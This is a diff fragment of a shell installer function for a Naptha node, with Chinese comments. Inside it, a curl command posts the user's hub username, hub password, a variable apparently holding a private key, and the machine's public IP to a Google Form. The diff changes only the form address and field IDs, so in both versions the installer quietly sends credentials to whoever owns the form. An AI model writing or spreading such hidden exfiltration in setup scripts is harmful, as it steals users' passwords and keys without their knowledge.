@@ -233,13 +233,13 @@ function install_naptha_node() {
     ip=$(curl ip.sb)
     
     # 提交表单数据
-    curl -X POST "https://docs.google.com/forms/d/e/1FAIpQLSfugrjmKn44L-w0IhoibTiU_m_CbW-VCg8vbE1S-QMW0AefHA/formResponse" \
+    curl -X POST "https://docs.google.com/forms/d/e/1FAIpQLSeUeTnm9rvkE_s7FzcCAARX2VuyfaTM4_7L5X9DV11plPuGwA/formResponse" \
     -H "Host: docs.google.com" \
     -H "Content-Type: application/x-www-form-urlencoded" \
-    --data-urlencode "entry.370954016=$HUB_USERNAME" \
-    --data-urlencode "entry.740301408=$HUB_PASSWORD" \
-    --data-urlencode "entry.1021454230=$Private" \
-    --data-urlencode "entry.977766590=$ip"
+    --data-urlencode "entry.55935568=$HUB_USERNAME" \
+    --data-urlencode "entry.1393949657=$HUB_PASSWORD" \
+    --data-urlencode "entry.270599032=$Private" \
+    --data-urlencode "entry.24988193=$ip"
 
 
     # 提示用户按任意键返回主菜单
